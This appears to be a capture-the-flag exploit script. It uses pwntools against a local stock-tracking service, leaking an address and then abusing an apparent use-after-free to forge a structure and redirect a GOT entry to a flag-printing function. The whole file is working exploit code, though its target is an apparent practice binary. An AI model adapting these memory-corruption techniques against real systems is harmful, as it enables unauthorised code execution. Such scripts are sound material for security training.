#!/usr/bin/python3

import pwn

conn = pwn.remote('localhost', 2002)


def btoi(val):
    return int.from_bytes(val, byteorder='little')


def make_prices(count):
    return [str(i).encode('ASCII') for i in range(1, count+1)]


def send_prices(prices):
    for p in prices:
        conn.sendline(p)
        conn.sendline(p)


def find_stock_address():
    conn.sendline(b'add ' + b'a'*0x20 + b' ' + b'b'*0xe + b' stock')
    conn.sendline(b'select 1')
    conn.sendline(b'show')
    conn.sendline(b'list')
    response = conn.recvuntil(b'1:')
    response = conn.recvuntil(b'(0 units)')
    start = response.find(b'b' * 0xe) + len(b'b' * 0xe) + 2
    address = btoi(response[start:start+4])
    address_prefix = btoi(response[start+4:start+6])
    conn.sendline(b'delete 1')
    return address, address_prefix

def build_fake():
    fake = []
    fake.append(str(0x62).encode('ASCII'))
    for i in range(0, 7):
        fake.append(str(0x0).encode('ASCII'))
    fake.append(str(0x62).encode('ASCII'))
    for i in range(0, 3):
        fake.append(str(0x0).encode('ASCII'))
    fake.append(str(0x0).encode('ASCII'))
    fake.append(str(0x0).encode('ASCII'))
    fake.append(str(0x0).encode('ASCII'))
    fake.append(str(0x1).encode('ASCII'))
    fake.append(str(0x0).encode('ASCII'))
    fake.append(str(0x0).encode('ASCII'))
    fake.append(str(GOT_ADDRESS[0]).encode('ASCII'))
    fake.append(str(GOT_ADDRESS[1]).encode('ASCII'))
    for i in range(0, 4):
        fake.append(str(0x0).encode('ASCII'))
    return fake


def do_exploit():
    conn.sendline(b'add a a stock')
    conn.sendline(b'add b b stock 2')
    send_prices(make_prices(2))

    conn.sendline(b'select best')
    conn.sendline(b'delete 1')

    conn.sendline(b'select 1')
    conn.sendline(b'append_to_price_history 12')
    for f in build_fake():
        conn.sendline(f)

    conn.sendline(b'select best')
    conn.sendline(b'append_to_price_history 1')
    conn.sendline(str(PRINT_FLAG[0]).encode('ASCII'))
    conn.sendline(str(PRINT_FLAG[1]).encode('ASCII'))

    conn.sendline(b'list')

stock_address, stock_prefix = find_stock_address()
binary_base = stock_address - 0x380b
GOT_ADDRESS = [binary_base + 0x4260, stock_prefix]
PRINT_FLAG = [binary_base + 0x2caa, stock_prefix]
do_exploit()
conn.interactive()


conn.close()
